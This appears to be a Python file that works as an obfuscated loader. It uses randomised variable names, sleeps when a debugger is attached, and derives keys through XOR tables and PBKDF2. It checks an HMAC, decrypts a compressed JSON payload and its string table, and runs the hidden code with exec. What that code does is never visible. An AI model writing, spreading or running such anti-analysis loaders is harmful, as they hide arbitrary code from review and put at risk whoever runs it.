import base64, zlib, json, hashlib, hmac, sys, time
import sys, time
tracef = getattr(sys, 'gettrace', None)
if tracef and tracef():
    time.sleep(5)
_80d74e_0 = 'hk0MC429SXL0/y+oCfi1nWaJuoI46RZVshQMzhBXLU6PW62CbW+fGeag'
_80d74e_1 = 'ZvYDKTt+KbIX724De315/ApGB5eXQZGBh0j1DSeTtpq'
_80d74e_2 = 'DwTL4Jg2ZvVGlnmPYRRI84RTF9SbWTT283fHqPZc6'
_pls = [_80d74e_0, _80d74e_1, _80d74e_2]
_9b3a43 = [(23101,10137,2),(25916,12831,2),(27430,8554,2),(46294,45946,2),(33842,63798,2),(32422,33105,2),(60853,21595,2),(42418,65041,2),(43364,53483,2),(34697,58148,2),(13700,62906,2),(49339,63071,2),(29664,55287,2),(65253,15539,2),(21917,995,2),(62030,36251,2),(0,0,0),(0,0,0)]
_b60033 = 'faRXIw=='
_796843 = 'IcLJG/4s9zqmWBtE'
_afd236 = 'PVNFGufzrIU='
_5fc3d2 = [1, 2, 0]
_salt = base64.b64decode(_afd236)
mhash = hashlib.sha256((__name__ + '|' + repr(globals().get('__file__',''))).encode('utf-8') + _salt).digest()
rbytes = list(mhash)
_perm = list(range(len(_pls)))
for _i in range(len(_perm)-1, 0, -1):
    _j = (rbytes[_i % len(rbytes)] + _i) % (_i + 1)
    _perm[_i], _perm[_j] = _perm[_j], _perm[_i]
_idxs = _5fc3d2
_assembled_list = []
_npls = len(_pls)
for _i in range(_npls):
    _pos = None
    try:
        _pos = _idxs.index(_i)
    except Exception:
        _pos = None
    if _pos is not None:
        _assembled_list.append(_pls[_pos])
_assembled = ''.join(_assembled_list)
_5f4d9b = base64.b64decode(_assembled)
_e60383 = 32
_5b059b = _5f4d9b[:-_e60383]
_e60383 = _5f4d9b[-_e60383:]
_bdbb2f = (lambda P: b''.join(((v ^ m).to_bytes(l, 'big') for (v,m,l) in P if l)))(_9b3a43)
_hdr = base64.b64decode(_b60033)
_nonce = base64.b64decode(_796843)
_km_seed = hashlib.sha256(_bdbb2f + _hdr + _nonce).digest()
_km = hashlib.pbkdf2_hmac('sha256', _km_seed, _nonce, 100000, dklen=32)
_blob_seed = hashlib.sha256(_km + b'blob').digest()
_blob_k = hashlib.pbkdf2_hmac('sha256', _blob_seed, _nonce, 20000, dklen=32)
_calc_tag = hmac.new(_blob_k, _5b059b, hashlib.sha256).digest()
if _calc_tag != _e60383:
    raise RuntimeError('integrity check failed')
_bs = b''
_ctr = 0
_need = len(_5b059b)
while len(_bs) < _need:
    _bs += hashlib.sha256(_blob_k + _ctr.to_bytes(4, 'little')).digest()
    _ctr += 1
_raw = bytes(a ^ b for a, b in zip(_5b059b, _bs[:_need]))
_dec = zlib.decompress(_raw).decode('utf-8')
_J = json.loads(_dec)
mmap = {}
for _i, _enc in enumerate(_J['strs']):
    _c = base64.b64decode(_enc)
    _seed = hashlib.sha256(_km + b'str' + _i.to_bytes(4, 'little')).digest()
    _ks = b''
    _ctr = 0
    _need = len(_c)
    while len(_ks) < _need:
        _ks += hashlib.sha256(_seed + _ctr.to_bytes(4, 'little')).digest()
        _ctr += 1
    _pt = bytes(a ^ b for a, b in zip(_c, _ks[:_need]))
    mmap[str(_i)] = _pt.decode('utf-8')
globals()['_4b68c6'] = mmap
globals()['_4514b5'] = lambda i: globals()['_4b68c6'][str(i)]
_x = globals()['_4514b5']
exec(compile(_J['s'], '<obf>', 'exec'), globals())
